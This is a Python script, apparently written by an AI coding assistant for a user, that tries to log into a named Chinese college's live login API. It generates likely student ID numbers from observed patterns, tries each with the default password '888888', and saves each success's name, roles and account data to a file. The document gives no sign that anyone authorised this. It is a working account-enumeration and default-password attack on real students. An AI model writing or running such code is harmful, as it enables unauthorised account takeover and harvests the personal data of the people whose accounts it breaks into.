#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
哈尔滨信息工程学院真实School API账号测试程序
测试学号规律和默认密码的有效性
"""

import requests
import json
import time
from typing import List, Dict, Any

class SchoolAPITester:
    def __init__(self):
        self.base_url = "https://work.greathiit.com/api/user/loginWai"
        self.headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        self.valid_accounts = []
        self.invalid_accounts = []
        
    def test_login(self, user_number: str, password: str = "888888") -> Dict[str, Any]:
        """
        测试单个账号登录
        """
        payload = {
            "userNumber": user_number,
            "password": password,
            "autoLogin": True,
            "provider": "account"
        }
        
        try:
            print(f"🧪 测试账号: {user_number} / {password}")
            response = requests.post(self.base_url, 
                                   json=payload, 
                                   headers=self.headers, 
                                   timeout=10)
            
            result = {
                "userNumber": user_number,
                "password": password,
                "status_code": response.status_code,
                "success": False,
                "data": None,
                "error": None
            }
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    result["data"] = data
                    
                    # 判断登录是否成功
                    if data.get("success") == True or data.get("code") == 200:
                        result["success"] = True
                        print(f"✅ 登录成功: {user_number}")
                        print(f"   用户信息: {json.dumps(data, ensure_ascii=False, indent=2)}")
                        self.valid_accounts.append(result)
                    else:
                        result["error"] = data.get("message", "登录失败")
                        print(f"❌ 登录失败: {user_number} - {result['error']}")
                        self.invalid_accounts.append(result)
                        
                except json.JSONDecodeError as e:
                    result["error"] = f"JSON解析错误: {str(e)}"
                    print(f"❌ 响应解析失败: {user_number} - {result['error']}")
                    self.invalid_accounts.append(result)
            else:
                result["error"] = f"HTTP {response.status_code}"
                print(f"❌ HTTP错误: {user_number} - {result['error']}")
                self.invalid_accounts.append(result)
                
            return result
            
        except requests.RequestException as e:
            result = {
                "userNumber": user_number,
                "password": password,
                "status_code": 0,
                "success": False,
                "data": None,
                "error": f"网络错误: {str(e)}"
            }
            print(f"❌ 网络错误: {user_number} - {result['error']}")
            self.invalid_accounts.append(result)
            return result

    def generate_test_accounts(self) -> List[str]:
        """
        基于学号规律生成测试账号
        """
        test_accounts = []
        
        # 2024年级学号规律: 2024010009, 2024010011
        # 推测规律: 202401xxxx
        print("🎯 生成2024年级测试学号...")
        for i in [9, 11, 12, 13, 15, 16, 18, 20]:
            account = f"20240100{i:02d}"
            test_accounts.append(account)
        
        # 2023年级学号规律: 2023010109, 2023010114, 2023010121
        # 推测规律: 202301xxxx
        print("🎯 生成2023年级测试学号...")  
        for i in [109, 114, 121, 122, 125, 130, 135]:
            account = f"2023010{i}"
            test_accounts.append(account)
            
        # 2022年级学号规律: 2022010606, 2022010616, 2022010619, 2022010620
        # 推测规律: 202201xxxx
        print("🎯 生成2022年级测试学号...")
        for i in [606, 616, 619, 620, 621, 625, 630]:
            account = f"2022010{i}"
            test_accounts.append(account)
            
        return test_accounts

    def batch_test(self, max_accounts: int = 10, delay: float = 1.0):
        """
        批量测试账号
        """
        print("🚀 开始批量测试账号...")
        print(f"⚙️ 配置: 最大测试{max_accounts}个账号, 延迟{delay}秒")
        print("=" * 80)
        
        test_accounts = self.generate_test_accounts()[:max_accounts]
        
        for i, account in enumerate(test_accounts, 1):
            print(f"\n📋 进度: {i}/{len(test_accounts)}")
            self.test_login(account)
            
            # 避免请求过于频繁
            if i < len(test_accounts):
                time.sleep(delay)
        
        self.print_summary()
        
    def print_summary(self):
        """
        打印测试总结
        """
        print("\n" + "=" * 80)
        print("📊 测试总结")
        print("=" * 80)
        
        print(f"✅ 成功登录账号数: {len(self.valid_accounts)}")
        if self.valid_accounts:
            print("🎯 可用测试账号:")
            for account in self.valid_accounts:
                user_data = account["data"]
                user_info = user_data.get("data", {}) if user_data else {}
                role_info = user_info.get("roleNames", []) if user_info else []
                name = user_info.get("name", "未知") if user_info else "未知"
                
                print(f"   📱 学号: {account['userNumber']}")
                print(f"   👤 姓名: {name}")
                print(f"   🎭 角色: {role_info}")
                print(f"   🔐 密码: {account['password']}")
                print()
        
        print(f"❌ 登录失败账号数: {len(self.invalid_accounts)}")
        if self.invalid_accounts:
            print("💥 失败原因统计:")
            error_stats = {}
            for account in self.invalid_accounts:
                error = account["error"] or "未知错误"
                error_stats[error] = error_stats.get(error, 0) + 1
            
            for error, count in error_stats.items():
                print(f"   {error}: {count}次")
        
        # 保存结果到JSON文件
        self.save_results()
        
    def save_results(self):
        """
        保存测试结果到文件
        """
        results = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "total_tested": len(self.valid_accounts) + len(self.invalid_accounts),
            "valid_count": len(self.valid_accounts),
            "invalid_count": len(self.invalid_accounts),
            "valid_accounts": self.valid_accounts,
            "invalid_accounts": self.invalid_accounts
        }
        
        filename = f"school_api_test_results_{int(time.time())}.json"
        filepath = f"D:\\ClaudeCode\\AI_Web\\{filename}"
        
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(results, f, ensure_ascii=False, indent=2)
            print(f"💾 测试结果已保存: {filepath}")
        except Exception as e:
            print(f"❌ 保存结果失败: {str(e)}")

def main():
    print("=== 哈尔滨信息工程学院真实School API测试程序 ===")
    print("测试学号规律和默认密码888888")
    print("API地址: https://work.greathiit.com/api/user/loginWai")
    print()
    
    tester = SchoolAPITester()
    
    # 先测试几个已知账号验证可行性
    print("第一阶段: 验证可行性测试")
    print("-" * 50)
    
    # 基于您提供的规律测试几个账号
    sample_accounts = [
        "2024010009",  # 24年级已知学号
        "2024010011",  # 24年级已知学号  
        "2023010109",  # 23年级已知学号
        "2023010114",  # 23年级已知学号
        "2022010606"   # 22年级已知学号
    ]
    
    for account in sample_accounts:
        result = tester.test_login(account)
        time.sleep(0.5)  # 短暂延迟
        
        if result["success"]:
            print(f"🎉 发现可用账号! 继续批量测试...")
            break
    
    # 如果有成功的账号，进行批量测试
    if tester.valid_accounts:
        print(f"\n🚀 第二阶段: 批量测试更多账号")
        print("-" * 50)
        tester.batch_test(max_accounts=15, delay=1.0)
    else:
        print(f"\n⚠️ 初步测试未发现可用账号")
        print("📝 建议检查:")
        print("   1. 网络连接是否正常") 
        print("   2. API地址是否正确")
        print("   3. 学号格式是否正确")
        print("   4. 默认密码是否正确")

if __name__ == "__main__":
    main()